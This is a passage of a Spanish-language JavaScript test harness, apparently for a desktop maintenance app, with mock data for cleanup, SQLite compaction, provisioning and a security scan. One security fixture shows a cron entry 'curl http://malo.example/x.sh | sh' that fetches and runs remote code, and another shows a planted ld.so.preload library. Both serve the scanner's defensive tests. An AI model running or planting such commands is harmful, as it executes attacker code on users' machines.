  "almacen:vacias": ["/home/usuario/proyecto-viejo/build", "/home/usuario/.cache/huerfana"],
  "almacen:enlaces": [
    { ruta: "/home/usuario/bin/viejo", destino: "/usr/local/bin/viejo" },
  ],

  // La papelera del sistema y las copias de seguridad (Centro de recuperación).
  "papelera:estado": {
    elementos: 75,
    bytes: 230_746_895,
    ruta: "/home/usuario/.local/share/Trash",
  },
  "copias:listar": [
    {
      id: 1,
      ts: ahoraSeg - 600,
      ruta_original: "/home/usuario/.pi/agent/models.json",
      ruta_copia: "/home/usuario/.pi/agent/models.json.bak-20261003-130501",
      bytes: 2048,
      motivo: "conectar un cliente",
      existe: true,
    },
    {
      id: 2,
      ts: ahoraSeg - 7200,
      ruta_original: "/home/usuario/.config/autostart/x.desktop",
      ruta_copia: "/home/usuario/.config/autostart/x.desktop.bak-20261003-110000",
      bytes: 512,
      motivo: "cambio desde Machinograph",
      // Una copia que alguien borró por fuera: la interfaz lo dice y no ofrece
      // un botón que fallaría.
      existe: false,
    },
  ],

  // ── Optimización: catálogo de basura y arranque ───────────────────────────
  "limpieza:categorias": [
    { id: "sistema", nombre: "Sistema" },
    { id: "navegadores", nombre: "Navegadores" },
    { id: "apps", nombre: "Aplicaciones" },
    { id: "ia", nombre: "Herramientas de IA" },
    { id: "gpu", nombre: "Gráfica" },
    { id: "juegos", nombre: "Juegos" },
    // La categoría de huellas SÍ existe en el catálogo real (y esta vista la
    // esconde a propósito: sus objetivos no son basura).
    { id: "privacidad", nombre: "Privacidad" },
  ],
  "limpieza:escanear": {
    objetivos: [
      { id: "uv", categoria: "apps", subcategoria: "uv (caché)", descripcion: "uv limpia su caché mejor con su comando: conserva lo que sigue en uso", rutas: ["/home/usuario/.cache/uv"], bytes: 16 * 1024 ** 3, elementos: 28_431, recientes: 0, min_dias: 0, root: false, comando: "uv cache prune", sin_permiso: false, parcial: false },
      { id: "pip", categoria: "apps", subcategoria: "Caché de pip", descripcion: "Ruedas y fuentes descargadas por pip; se vuelven a bajar", rutas: ["/home/usuario/.cache/pip"], bytes: 9 * 1024 ** 3, elementos: 870, recientes: 0, min_dias: 0, root: false, comando: null, sin_permiso: false, parcial: false },
      { id: "flatpak-app-cache", categoria: "sistema", subcategoria: "Cachés de apps Flatpak", descripcion: "Caché interna de cada aplicación Flatpak instalada; se regenera", rutas: ["/home/usuario/.var/app/org.kde.krita/cache"], bytes: 3 * 1024 ** 3, elementos: 36_312, recientes: 0, min_dias: 0, root: false, comando: null, sin_permiso: false, parcial: false },
      { id: "papelera", categoria: "sistema", subcategoria: "Papelera del escritorio", descripcion: "Lo que hay en la papelera; es lo único que libera de verdad ese espacio", rutas: ["/home/usuario/.local/share/Trash"], bytes: 220 * 1024 ** 2, elementos: 8_067, recientes: 0, min_dias: 0, root: false, comando: null, sin_permiso: false, parcial: false },
      { id: "dnf", categoria: "sistema", subcategoria: "Caché de DNF", descripcion: "Paquetes RPM descargados por DNF (necesita root)", rutas: ["/var/cache/dnf"], bytes: 0, elementos: 0, recientes: 0, min_dias: 0, root: true, comando: "sudo dnf clean packages", sin_permiso: true, parcial: false },
      { id: "claude-logs", categoria: "ia", subcategoria: "Claude (registros)", descripcion: "Registros de diagnóstico de Claude de más de una semana", rutas: ["/home/usuario/.claude/debug"], bytes: 0, elementos: 0, recientes: 12, min_dias: 7, root: false, comando: null, sin_permiso: false, parcial: false },
      // Huellas de actividad: `traza: true`. Optimización NO las lista (van a
      // Seguridad, una a una), y esta prueba lo comprueba.
      { id: "hist-bash", categoria: "privacidad", subcategoria: "Historial de bash", descripcion: "Los comandos que has escrito en bash", rutas: ["/home/usuario/.bash_history"], bytes: 4096, elementos: 1, recientes: 0, min_dias: 0, root: false, comando: null, sin_permiso: false, parcial: false, traza: true },
      { id: "recientes", categoria: "privacidad", subcategoria: "Documentos recientes", descripcion: "La lista de lo último que has abierto", rutas: ["/home/usuario/.local/share/recently-used.xbel"], bytes: 76 * 1024, elementos: 1, recientes: 0, min_dias: 0, root: false, comando: null, sin_permiso: false, parcial: false, traza: true },
      { id: "portapapeles-kde", categoria: "privacidad", subcategoria: "Portapapeles (KDE)", descripcion: "Todo lo que has copiado, que Klipper guarda", rutas: ["/home/usuario/.local/share/klipper"], bytes: 2 * 1024 ** 2, elementos: 1_856, recientes: 0, min_dias: 0, root: false, comando: null, sin_permiso: false, parcial: false, traza: true },
    ],
    // 16 + 9 + 3 GiB + 220 MiB, exacto: la interfaz convierte bytes a unidades
    // binarias, así que el total se enseña como «28.2 GB» y la prueba lo compara
    // con lo que se LEE, no con lo que ocupa de verdad.
    bytes: 28 * 1024 ** 3 + 220 * 1024 ** 2,
    elementos: 73_692,
    ms: 2_362,
    truncado: false,
    // Un objetivo que NO se ha medido por una exclusión del usuario: la interfaz
    // tiene que decirlo (un total más bajo sin explicación parece un fallo).
    excluidos: ["Caché de Zypper: excluido por «/var/cache/zypp»"],
  },
  // ── Seguridad: lo que se ejecuta solo, con su prueba ──────────────────────
  // El orden es el del backend (el de la comprobación); la interfaz lo reordena
  // por gravedad, y esta prueba lo comprueba. Un `problema` de verdad y un
  // `desconocido` que NO puede pintarse como si estuviera bien.
  "seguridad:revisar": {
    resumen: "problema",
    hallazgos: [
      { id: "autostart", titulo: "Programas que arrancan solos", veredicto: "ok", detalle: "28 entrada(s), ninguna que apunte a descargas ni a temporales.", remedio: null, fuente: "entradas de arranque de la sesión" },
      { id: "yara", titulo: "Reglas YARA (opcional)", veredicto: "desconocido", detalle: "`yara` no está instalado, así que no se aplican reglas. Machinograph NO baja reglas de internet a propósito: son tuyas y locales.", remedio: "Si quieres usarlas: instala `yara` y deja tus ficheros `.yar` en ~/.config/machinograph/yara/.", fuente: "/home/usuario/.config/machinograph/yara/" },
      { id: "cron-usuario", titulo: "Tareas programadas tuyas", veredicto: "aviso", detalle: "1 tarea(s) con pinta de descarga y ejecución: 15 * * * * curl http://malo.example/x.sh | sh", remedio: "Míralas con `crontab -l` y quita lo que no hayas puesto tú (`crontab -e`).", fuente: "crontab -l" },
      { id: "ld-preload", titulo: "Gancho de bibliotecas (ld.so.preload)", veredicto: "problema", detalle: "Fuerza estas bibliotecas en TODOS los programas: /usr/lib/libmalo.so", remedio: "Míralo antes de tocar nada (`cat /etc/ld.so.preload`). Si no lo has puesto tú, quítalo como root y revisa cómo llegó ahí.", fuente: "/etc/ld.so.preload" },
    ],
  },
  // ── Exclusiones: lo que no se mide ni se borra ────────────────────────────
  // El simulador es ESTATAL a propósito: la prueba añade una exclusión y tiene que
  // verla aparecer en la lista (y desaparecer al quitarla), que es el viaje
  // completo que hace el usuario.
  "exclusiones:listar": {
    guardadas: [
      { patron: "/var/cache/zypp", ts: 1759400000 },
      { patron: "${HOME}/VMs", ts: 1759300000 },
    ],
    vigentes: [
      { patron: "/var/cache/zypp", descripcion: "/var/cache/zypp → /var/cache/zypp", resuelta: "/var/cache/zypp" },
      {
        patron: "${HOME}/VMs",
        descripcion: "${HOME}/VMs → /home/usuario/VMs",
        resuelta: "/home/usuario/VMs",
      },
    ],
  },
  "exclusiones:comprobar": { excluida: true, patron: "/var/cache/zypp" },
  // ── Bases de datos SQLite (espacio recuperable con VACUUM) ────────────────
  // Tres estados distintos a propósito: una se puede compactar, otra está
  // BLOQUEADA (con el proceso que la tiene abierta) y otra no se pudo medir. La
  // interfaz tiene que decir las tres cosas y no convertir ninguna en un 0.
  "bases:listar": {
    bases: [
      {
        app: "Firefox",
        ruta: "/home/usuario/.mozilla/firefox/ab12cd34.default/places.sqlite",
        perfil: "ab12cd34.default",
        bytes: 52_428_800,
        paginas: 12_800,
        pagina_bytes: 4096,
        libres: 900,
        recuperable: 3_686_400,
        disco: 52_428_800,
        wal_bytes: 1_048_576,
        auto_vacuum: "none",
        journal: "wal",
        estado: "ok",
        nota: null,
        comando: "sqlite3 '/home/usuario/.mozilla/firefox/ab12cd34.default/places.sqlite' \"VACUUM;\"",
      },
      {
        app: "VS Code",
        ruta: "/home/usuario/.config/Code/User/globalStorage/state.vscdb",
        perfil: null,
        bytes: 8_388_608,
        paginas: 2048,
        pagina_bytes: 4096,
        libres: 300,
        recuperable: 1_228_800,
        disco: 8_388_608,
        wal_bytes: 0,
        auto_vacuum: "incremental",
        journal: "wal",
        estado: "bloqueada",
        nota: "la tiene abierta el proceso Code (pid 4321)",
        comando: "sqlite3 '/home/usuario/.config/Code/User/globalStorage/state.vscdb' \"VACUUM;\"",
      },
      {
        app: "Chrome",
        ruta: "/home/usuario/.config/google-chrome/Default/Network/Cookies",
        perfil: "Default",
        bytes: null,
        paginas: null,
        pagina_bytes: null,
        libres: null,
        recuperable: null,
        disco: 20_971_520,
        wal_bytes: 0,
        auto_vacuum: null,
        journal: null,
        estado: "sin_permiso",
        nota: "no se pudo abrir en solo lectura: permission denied",
        comando: "sqlite3 '/home/usuario/.config/google-chrome/Default/Network/Cookies' \"VACUUM;\"",
      },
    ],
    total: 3,
    medidas: 2,
    bloqueadas: 1,
    sin_permiso: 1,
    errores: 0,
    bytes_recuperables: 5_242_880,
    bytes_ocupados: 60_817_408,
    wal_bytes: 1_048_576,
    ms: 143,
    truncado: false,
    sistema: "linux",
    sin_traducir: [],
    nota: null,
  },
  "bases:compactar": {
    resultados: [
      {
        app: "Firefox",
        ruta: "/home/usuario/.mozilla/firefox/ab12cd34.default/places.sqlite",
        ok: true,
        estado: "ok",
        motivo: null,
        bloqueantes: [],
        liberado: 3_686_400,
        recuperable_antes: 3_686_400,
        recuperable_despues: 0,
        bytes_antes: 52_428_800,
        bytes_despues: 48_742_400,
        disco_antes: 53_477_376,
        disco_despues: 48_742_400,
        ms: 96,
      },
      {
        app: "VS Code",
        ruta: "/home/usuario/.config/Code/User/globalStorage/state.vscdb",
        ok: false,
        estado: "bloqueada",
        motivo: "la base está en uso: no se ha reescrito ni un byte",
        bloqueantes: ["Code (pid 4321)"],
        liberado: 0,
        recuperable_antes: 1_228_800,
        recuperable_despues: 1_228_800,
        bytes_antes: 8_388_608,
        bytes_despues: 8_388_608,
        disco_antes: 8_388_608,
        disco_despues: 8_388_608,
        ms: 12,
      },
    ],
    liberado: 3_686_400,
    compactadas: 1,
    bloqueadas: 1,
    fallos: 0,
    ms: 108,
    // El resultado dice lo liberado DE VERDAD (medido antes y después), no lo previsto.
    mensaje:
      "Se liberaron 3.5 MB: 1 base compactada. 1 quedó bloqueada (Code (pid 4321)): ciérrala y reintenta.",
  },
  // ── Lo que la app necesita (autoinstalación) ──────────────────────────────
  // Tres estados distintos: una instalada y funcionando, una que falta y SÍ se
  // instala sola, y una que necesita root (se detecta y se da el comando exacto,
  // porque la app no instala paquetes del sistema).
  "provision:estado": {
    herramientas: [
      {
        id: "llmfit",
        nombre: "llmfit",
        para_que: "Descargar modelos, recomendaciones y plan de hardware",
        imprescindible: true,
        instalable: true,
        estado: "listo",
        origen: "https://github.com/AlexsJones/llmfit",
        ruta: "/home/usuario/.local/share/machinograph/bin/llmfit/llmfit",
        version: "llmfit 1.1.16",
        motivo_manual: null,
        comando_manual: null,
        detalle: null,
      },
      {
        id: "llama.cpp",
        nombre: "llama.cpp (llama-bench, llama-fit-params)",
        para_que: "Medir tokens/s de verdad y calcular el encaje medido",
        imprescindible: false,
        instalable: true,
        estado: "falta",
        origen: "https://github.com/ggml-org/llama.cpp",
        ruta: null,
        version: null,
        motivo_manual: null,
        comando_manual: null,
        detalle: "Son ~17 MB; se instalan dentro de tu carpeta de datos, sin tocar el sistema.",
      },
      {
        id: "amd-smi",
        nombre: "amd-smi",
        para_que: "Uso, temperatura y potencia de la GPU AMD",
        imprescindible: false,
        instalable: false,
        estado: "noinstalable",
        origen: "ROCm (paquete del sistema)",
        ruta: null,
        version: null,
        motivo_manual: "Viene con ROCm y necesita root: la app no instala paquetes del sistema.",
        comando_manual: "sudo dnf install rocm-smi",
        detalle: null,
      },
    ],
    auto_provision: true,
    en_curso: null,
  },
  "provision:auto": true,
  // ── Autorreparación: lo que la app se mira a sí misma ─────────────────────
  // Tres estados a propósito: una cosa correcta, una que se ha reparado (con lo
  // que se hizo y dónde) y una que no se pudo (con lo que haría falta).
  "salud:revisar": {
    resumen: "1 reparada / 1 sin arreglar.",
    reparadas: 1,
    sin_arreglar: 1,
    comprobaciones: [
      {
        id: "base",
        titulo: "Base de datos",
        estado: "reparado",
        detalle:
          "Se apartó una base dañada en /home/usuario/.local/share/machinograph/data.db.corrupta-20261003-141502 y se empezó una nueva con su esquema. La anterior NO se ha borrado.",
        como_arreglarlo: null,
      },
      {
        id: "arranque",
        titulo: "Arranque al iniciar sesión",
        estado: "correcto",
        detalle: "La entrada apunta al binario que está en marcha; no había nada que hacer.",
        como_arreglarlo: null,
      },
      {
        id: "puerto",
        titulo: "Puerto de la puerta de enlace",
        estado: "correcto",
        detalle: "Escuchando en el 8100 (el configurado).",
        como_arreglarlo: null,
      },
      {
        id: "config",
        titulo: "Configuración escrita por la app",
        estado: "no_se_pudo",
        detalle: "No hay copia de seguridad de /home/usuario/.pi/agent/models.json, así que no se ha tocado.",
        como_arreglarlo: "Vuelve a escribir la configuración desde Conexiones: antes de escribir se guarda una copia.",
      },
    ],
  },
  // ── Histórico de disco: dos medidas y lo que ha cambiado ──────────────────
  // A propósito con un hijo que CRECE, otro que BAJA, otro recién aparecido (con
  // `pct: null` porque antes estaba a cero: no se inventa un porcentaje) y un
  // renombrado representado como nuevo + desaparecido, que es lo que ha pasado.
  "almacen:historial": {
    ruta: "/home/usuario",
    activo: true,
    umbral_gb: 5,
    retencion_dias: 90,
    dias: 7,
    instantaneas: [
      {
        ts: ahoraSeg - 7 * 86400,
        ruta: "/home/usuario",
        bytes: 320_000_000_000,
        ficheros: 1_260_000,
        dirs: 155_000,
        truncado: false,
        excluidos: [],
        resto_n: 0,
        resto_bytes: 0,
        hijos: [],
      },
      {
        ts: ahoraSeg - 600,
        ruta: "/home/usuario",
        bytes: 332_400_000_000,
        ficheros: 1_272_109,
        dirs: 156_185,
        truncado: false,
        excluidos: [],
        resto_n: 0,
        resto_bytes: 0,
        hijos: [],
      },
    ],
    crecimiento: {
      ruta: "/home/usuario",
      antes_ts: ahoraSeg - 7 * 86400,
      ahora_ts: ahoraSeg - 600,
      segundos: 7 * 86400 - 600,
      antes_bytes: 320_000_000_000,
      ahora_bytes: 332_400_000_000,
      delta_bytes: 12_400_000_000,
      antes_ficheros: 1_260_000,
      ahora_ficheros: 1_272_109,
      delta_ficheros: 12_109,
      parcial: false,
      motivo: null,
      hijos_parcial: false,
      hijos_faltan: 0,
      hijos: [
        {
          ruta: "/home/usuario/models",
          nombre: "models",
          antes: 31_800_000_000,
          ahora: 41_200_000_000,
          delta: 9_400_000_000,
          pct: 29.6,
          nuevo: false,
          desaparecido: false,
        },
        {
          ruta: "/home/usuario/vm",
          nombre: "vm",
          antes: 0,
          ahora: 12_000_000_000,
          delta: 12_000_000_000,
          pct: null,
          nuevo: true,
          desaparecido: false,
        },
        {
          ruta: "/home/usuario/.cache",
          nombre: ".cache",
          antes: 32_900_000_000,
          ahora: 34_800_000_000,
          delta: 1_900_000_000,
          pct: 5.8,
          nuevo: false,
          desaparecido: false,
        },
        {
          ruta: "/home/usuario/.local",
          nombre: ".local",
          antes: 65_000_000_000,
          ahora: 64_900_000_000,
          delta: -100_000_000,
          pct: -0.2,
          nuevo: false,
          desaparecido: false,
        },
      ],
    },
  },
  "arranque:listar": [
    { id: "org.kde.kalendar.autostart", nombre: "KAlendar", exec: "/usr/bin/kalendar", comentario: null, ruta: "/etc/xdg/autostart/org.kde.kalendar.autostart.desktop", origen: "sistema", activo: true, oculta: false },
    { id: "ualauncher", nombre: "Universal Blue Launcher", exec: "/usr/bin/ublauncher", comentario: null, ruta: "/etc/xdg/autostart/ualauncher.desktop", origen: "sistema", activo: true, oculta: false },
    { id: "machinograph-extra", nombre: "Mi script de arranque", exec: "/home/usuario/bin/algo.sh", comentario: "Lo puse yo", ruta: "/home/usuario/.config/autostart/machinograph-extra.desktop", origen: "usuario", activo: false, oculta: false },
  ],

  // ── Actualizaciones y limpieza programada ─────────────────────────────────
  // Las fuentes son las de ESTE sistema (rpm-ostree en la imagen atómica, flatpak)
  // y se incluye el aviso que da rpm-ostree sobre su propio `--check`, porque la
  // interfaz tiene que enseñarlo tal cual.
  "actualizar:comprobar": [
    {
      id: "rpm-ostree",
      nombre: "Sistema (imagen atómica)",
      disponible: true,
      actualizaciones: [],
      comando_comprobar: "rpm-ostree upgrade --check",
      comando_aplicar: "ujust update",
      requiere_root: false,
      requiere_reinicio: true,
      nota: "Note: --check and --preview may be unreliable.  See https://github.com/coreos/rpm-ostree/issues/1579",
      error: null,
    },
    {
      id: "flatpak",
      nombre: "Aplicaciones Flatpak",
      disponible: true,
      actualizaciones: ["GNOME Application Platform version 50 (50)"],
      comando_comprobar: "flatpak remote-ls --updates",
      comando_aplicar: "flatpak update",
      requiere_root: false,
      requiere_reinicio: false,
      nota: null,
      error: null,
    },
    {
      id: "winget",
      nombre: "Aplicaciones (winget)",
      disponible: false,
      actualizaciones: [],
      comando_comprobar: "winget upgrade",
      comando_aplicar: "winget upgrade --all",
      requiere_root: false,
      requiere_reinicio: false,
      nota: null,
      error: null,
    },
  ],
  "programar:leer": { activa: true, hora: 4, minuto: 5, categorias: ["apps"], ultima: "2026-10-02" },
  "programar:guardar":
    "Limpieza programada a las 04:05. Mide y avisa; NO borra nada: eso lo decides tú.",
  "programar:recetas": [
    {
      titulo: "systemd (usuario)",
      destino: "~/.config/systemd/user/machinograph-limpieza.timer",
      contenido: "[Timer]\nOnCalendar=*-*-* 04:05:00\nPersistent=true",
      instrucciones: "systemctl --user enable --now machinograph-limpieza.timer",
    },
    {
      titulo: "¿Que además limpie?",
      destino: "—",
      contenido: "machinograph --cli limpiar --aplicar",
      instrucciones: "Cambia `--json` por `--aplicar` en el comando programado.",
    },
  ],
};

/* ── El log REAL de llama-swap (no se inventa nada) ───────────────────────── */

/**
 * Trae el log de verdad. Devuelve `null` si llama-swap no está en marcha.
 *
 * POR QUÉ `null` Y NO UN ERROR QUE ABORTA: antes, sin llama-swap, el arnés entero
 * se caía y no se podía comprobar NADA (ni lo que no tiene que ver con el motor).
 * Ahora se dice que no está y se OMITEN las comprobaciones que lo necesitan, en vez
 * de inventarse un log: una prueba que se salta con su motivo es honesta; una que
 * pasa con datos falsos, no.
 */
async function logReal() {
  try {
    const r = await fetch("http://127.0.0.1:8080/logs", { headers: { Accept: "text/plain" } });
    if (!r.ok) return null;
    return (await r.text()).split("\n");
  } catch {
    return null;
  }
}

/* ── Utilidades del test ─────────────────────────────────────────────────── */

const res = [];
const fallo = (msg) => {
  throw new Error(msg);
};
/**
 * Lo que no se puede comprobar en este entorno NO cuenta como verde.
 *
 * Se cuenta aparte y se dice por qué. Es lo único honesto: una comprobación que se
 * salta con su motivo se puede leer; una que pasa con datos inventados, no.
 */
const omitidas = [];

const t = async (nombre, fn) => {
  try {
    const detalle = await fn();
    // Convención: devolver un texto que empieza por `OMITIDA` es saltarse la
    // comprobación a propósito, con el motivo al lado.
    if (typeof detalle === "string" && detalle.startsWith("OMITIDA")) {
      omitidas.push({ nombre, motivo: detalle.replace(/^OMITIDA:?\s*/, "") });
      return;
    }
    res.push({ ok: true, nombre, detalle: detalle ?? "" });
  } catch (e) {
    res.push({ ok: false, nombre, detalle: e.message });
  }
};

const esperar = async (page, fn, que = "la condición", ms = 4000) => {
  const t0 = Date.now();
  for (;;) {
    if (await page.evaluate(fn)) return;
    if (Date.now() - t0 > ms) fallo(`no se cumplió ${que} en ${ms} ms`);
    await page.waitForTimeout(60);
  }
};

/** Los textos de la primera columna del cuerpo de la tabla visible. */
const columna0 = (page) =>
  page.$$eval("tbody tr", (filas) =>
    filas.map((f) => (f.querySelector("td")?.innerText ?? "").trim().split("\n")[0]),
  );

const ariaSort = (page, texto) =>
  page.$eval(
    `th:has(button:text-is("${texto}"))`,
    (th) => th.getAttribute("aria-sort"),
  );

const pulsar = async (page, selector) => {
  await page.click(selector);
  await page.waitForTimeout(120);
};

/**
 * Pulsa un botón por su NOMBRE ACCESIBLE (lo que oye un lector de pantalla).
 *
 * Por qué no `:text-is()`: la interfaz pinta los rótulos de sección en
 * MAYÚSCULAS por CSS, y `innerText` devuelve el texto YA transformado, así que
 * comparar por texto literal depende de la hoja de estilos y de si hay un icono
 * dentro. El nombre accesible es el contrato de verdad (y de paso comprueba que
 * el botón tiene uno, que es accesibilidad, no comodidad de la prueba).
 */
async function pulsarBoton(page, nombre) {
  const boton = page.getByRole("button", { name: nombre, exact: true }).first();
  try {
    await boton.click({ timeout: 5000 });
    await page.waitForTimeout(120);
  } catch {
    // Distinguir "no existe" de "existe pero no se puede pulsar" (deshabilitado):
    // son dos problemas distintos y el mensaje tiene que decir cuál es.
    const cuantos = await boton.count();
    const hay = await page.$$eval("#contenido button", (xs) =>
      xs
        .map((x) => x.getAttribute("aria-label") || x.innerText.replace(/\s+/g, " ").trim())
        .slice(0, 40),
    );
    fallo(`no se pudo pulsar «${nombre}» (${cuantos} coincidencias); los que hay: ${JSON.stringify(hay)}`);
  }
}

async function irA(page, seccion) {
  await page.click(`nav[aria-label="Secciones"] >> button:text-is("${seccion}")`);
  await page.waitForTimeout(150);
}

/* ── El test ────────────────────────────────────────────────────────────── */

const logCompleto = await logReal();
/**
 * La línea de AVISO que se le da al panel, y por qué puede ser sintética.
 *
 * El panel pinta las últimas 300 líneas y el fichero crece: el único [WARN] que
 * tenía este log se quedó atrás y desapareció al rotar, así que exigir "un aviso
 * REAL" hacía fallar la comprobación por el estado externo y no por el código
 * (pasó, y más de una vez por motivos distintos: primero por estar fuera de la
 * ventana, luego por no existir).
 *
 * Lo que se comprueba —que el nivel se distinga por texto, icono y color sin
 * depender del color solo— vale igual con una línea del formato real, así que:
 * si el log TIENE un aviso, se usa ese (y el informe lo dice); si no lo tiene, se
 * usa una línea sintética con el formato exacto, y el informe también lo dice.
 */
const warnReal = (logCompleto ?? []).find((l) => l.includes("[WARN]"));
// La puerta de enlace: el mismo objeto en las dos respuestas que la llevan.
datos["uso:resumen"].config = datos["gateway:estado"];

const avisoDelPanel =
  warnReal ??
  "[WARN] línea sintética de la prueba: el log real ahora mismo no tiene ningún aviso";
const log = [
  // Sin llama-swap no hay log: la comprobación que lo mira se OMITE antes de
  // llegar aquí (ver la comprobación 8), así que esto queda vacío y no se inventa.
  ...(logCompleto ?? []),
  avisoDelPanel,
  // El log real tampoco tiene ninguna línea [ERROR]: para comprobar que un error
  // se distingue se añade UNA línea sintética, y se dice. El resto (y el aviso de
  // arriba, cuando existe) son líneas reales de llama-swap.
  "[ERROR] línea sintética de la prueba: así se marca un error del motor",
];
const browser = await chromium.connectOverCDP(CDP);
const contexto = browser.contexts()[0] ?? (await browser.newContext());
const page = await contexto.newPage();

await page.addInitScript(
  ({ datos, log }) => {
    // ── Puente Tauri simulado: el mismo contrato que usa @tauri-apps/api ──
    const callbacks = new Map();
    const eventos = new Map();
    let siguienteId = 1;
    let siguienteEvento = 1;
    const llamadas = [];
    window.__LLAMADAS__ = llamadas;

    window.__TAURI_INTERNALS__ = {
      transformCallback(cb, once = false) {
        const id = siguienteId++;
        const envuelto = (payload) => {
          if (once) callbacks.delete(id);
          cb(payload);
        };
        callbacks.set(id, envuelto);
        window[`_${id}`] = envuelto;
        return id;
      },
      unregisterCallback(id) {
        callbacks.delete(id);
      },
      convertFileSrc: (p) => p,
      async invoke(cmd, args = {}) {
        llamadas.push({ cmd, args });
        if (cmd === "plugin:event|listen") {
          const eventId = siguienteEvento++;
          eventos.set(eventId, { event: args.event, cb: callbacks.get(args.handler) });
          return eventId;
        }
        if (cmd === "plugin:event|unlisten") {
          eventos.delete(args.eventId);
          return null;
        }
        if (cmd === "swap:logs") return log;

        // ── Respuestas que dependen de los ARGUMENTOS ──────────────────────
        // No es capricho: si el plan devolviera siempre lo mismo, la prueba no
        // podría demostrar que el contexto que se escribe llega al backend, ni
        // que el bloque generado corresponde a lo que se pidió.

        if (cmd === "llmfit:plan") {
          const a = args.args ?? {};
          const ctx = Number(a.context ?? 32768);
          const grande = ctx >= 65536;
          return {
            // El aviso de llmfit solo aparece con el contexto grande: así se
            // comprueba que se enseña cuando viene y que no se inventa si no.
            estimate_notice: grande
              ? "por encima de 32768 de contexto los números son menos fiables"
              : null,
            model_name: a.modelo,
            provider: "Qwen",
            context: ctx,
            quantization: a.quant ?? "Q4_K_M",
            kv_quant: "q4_0",
            disk_size_gb: 21.4,
            minimum: { vram_gb: 16.7, ram_gb: 8, cpu_cores: 4 },
            recommended: { vram_gb: 20, ram_gb: 16, cpu_cores: 8 },
            run_paths: [
              {
                path: "gpu",
                feasible: !grande,
                fit_level: grande ? "Marginal" : "Perfect",
                estimated_tps: grande ? 18.2 : 41.2,
                minimum: { vram_gb: 16.7, ram_gb: 8, cpu_cores: 4 },
                recommended: { vram_gb: 20, ram_gb: 16, cpu_cores: 8 },
                notes: ["con la caché KV en q4_0"],
              },
              {
                path: "cpu_offload",
                feasible: true,
                fit_level: "Good",
                estimated_tps: 9.4,
                minimum: { vram_gb: 8, ram_gb: 16, cpu_cores: 8 },
                recommended: { vram_gb: 12, ram_gb: 24, cpu_cores: 8 },
                notes: [],
              },
              {
                // Vía de SOLO CPU: `vram_gb: null` significa "no necesita VRAM",
                // que no es 0. La vista tiene que enseñar "—".
                path: "cpu_only",
                feasible: true,
                fit_level: "TooLight",
                estimated_tps: 1.8,
                minimum: { vram_gb: null, ram_gb: 24, cpu_cores: 8 },
                recommended: { vram_gb: null, ram_gb: 32, cpu_cores: 16 },
                notes: ["sin VRAM dedicada"],
              },
            ],
          };
        }

        if (cmd === "llmfit:concurrencia") {
          const a = args.args ?? {};
          return {
            model: a.modelo,
            run_mode: "gpu",
            fit_level: "Perfect",
            max_context_for_target: 262144,
            estimate: {
              kv_budget_gb: 14.2,
              kv_quant: "q4_0",
              pool_gb: 15.6,
              weights_resident_gb: 19.4,
              // Los tres campos que el backend expone desde ahora (antes se
              // tiraban): contexto nativo, cuantización de los pesos y memoria
              // recurrente por sesión. Los dos primeros son del fixture real.
              native_context: 262144,
              quant: "Q4_K_M",
              per_session_recurrent_gb: null,
              ladder: [
                { requested_context: 8192, effective_context: 8192, per_session_kv_gb: 0.5, max_sessions: 28 },
                { requested_context: 32768, effective_context: 32768, per_session_kv_gb: 2.0, max_sessions: 7 },
                { requested_context: 131072, effective_context: 131072, per_session_kv_gb: 8.0, max_sessions: 1 },
                // El último escalón NO cabe: 0 sesiones. Se enseña como "no cabe
                // ni una", no como un número suelto que parezca un dato más.
                { requested_context: 262144, effective_context: 262144, per_session_kv_gb: 16.0, max_sessions: 0 },
              ],
            },
          };
        }

        if (cmd === "conexiones:propuesta" || cmd === "conexiones:aplicar") {
          const a = args.args ?? {};
          // Se replica el comportamiento REAL de `conexiones.rs`, incluidas sus
          // negativas: solo gentle-shell tiene formato comprobado, y hacen falta
          // id válido, endpoint y al menos un modelo. Así la prueba comprueba
          // también que la interfaz enseña el rechazo tal cual.
          if (a.cliente !== "gentle-shell") {
            throw new Error(
              `no se genera una propuesta para '${a.cliente}': su formato no está comprobado aquí, y prefiero no inventármelo`,
            );
          }
          if (!a.id?.trim() || !/^[A-Za-z0-9_-]+$/.test(a.id)) {
            throw new Error(
              "el identificador del proveedor solo puede llevar letras, números, guiones y guion bajo",
            );
          }
          if (!a.endpoint?.trim()) throw new Error("falta la dirección del endpoint");
          const modelos = a.modelos ?? [];
          if (modelos.length === 0) throw new Error("hace falta al menos un modelo para el proveedor");

          // El fichero REAL del usuario, recortado: los modelos son OBJETOS con
          // su contexto y su compatibilidad. El merge los reutiliza tal cual, que
          // es lo que impide que cambiar el endpoint borre esos datos.
          const previos = {
            "modelo-27b": {
              api: "openai-completions",
              reasoning: true,
              maxTokens: 32768,
              id: "modelo-27b",
              name: "Modelo 27B · PQ2_0 · Vulkan",
              contextWindow: 262144,
            },
            "mimo-9b": {
              api: "openai-completions",
              reasoning: true,
              maxTokens: 8192,
              id: "mimo-9b",
              name: "MiMo V2.6 9B · Q8_0 · vision",
              contextWindow: 262144,
            },
          };
          const minimos = modelos.filter((m) => !previos[m]);
          const lista = modelos.map(
            (m) => previos[m] ?? { api: a.api, id: m, name: m },
          );
          const contenido = `${JSON.stringify(
            {
              providers: {
                "modelo-local-local": {
                  name: "Modelo local local (llama-swap)",
                  baseUrl: "http://127.0.0.1:8080/v1",
                  api: "openai-completions",
                  apiKey: "local",
                  models: [previos["modelo-27b"]],
                },
                [a.id]: {
                  name: a.nombre,
                  baseUrl: a.endpoint,
                  api: a.api,
                  apiKey: "local",
                  models: lista,
                },
              },
            },
            null,
            2,
          )}\n`;

          if (cmd === "conexiones:aplicar") {
            // El backend real escribe con copia, verifica releyendo y devuelve la
            // ruta de la copia: eso es lo que tiene que poder enseñar la interfaz.
            return {
              cliente: "gentle-shell",
              destino: "/home/usuario/.gentle-shell/agent/models.json",
              copia: "/home/usuario/.gentle-shell/agent/models.json.bak-20260927-094500",
              apunta_local: true,
              resumen: `Proveedor '${a.id}' escrito en /home/usuario/.gentle-shell/agent/models.json y comprobado releyendo el fichero. El original está en /home/usuario/.gentle-shell/agent/models.json.bak-20260927-094500.`,
            };
          }
          return {
            cliente: a.cliente,
            destino: "/home/usuario/.gentle-shell/agent/models.json",
            formato: "json",
            contenido,
            resumen: `El fichero COMPLETO como quedaría: el proveedor '${a.id}' se añade apuntando a ${a.endpoint}, con ${modelos.length} modelo(s).${
              minimos.length
                ? ` De ellos, ${minimos.length} no estaban ya en el fichero (${minimos.join(", ")}): van con lo mínimo —api, id y nombre— porque su contexto y su compatibilidad no se pueden inventar.`
                : ""
            }`,
